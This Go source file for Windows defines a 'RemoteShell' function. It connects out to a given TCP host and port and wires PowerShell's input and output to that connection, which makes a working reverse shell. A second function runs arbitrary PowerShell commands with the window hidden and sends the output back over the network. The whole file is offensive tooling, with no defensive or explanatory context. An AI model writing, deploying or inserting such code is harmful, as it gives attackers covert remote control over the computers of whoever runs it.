//go:build windows || !linux || !darwin || !freebsd
// +build windows !linux !darwin !freebsd

package gosh

import (
	"net"
	"os/exec"
	"syscall"
)

func RemoteShell(hostport string) error {
	conn, err := net.Dial("tcp", hostport)
	if nil != err {
		return err
	}
	cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd := exec.Command(cmd_path)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
	conn.Close()
	return nil
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
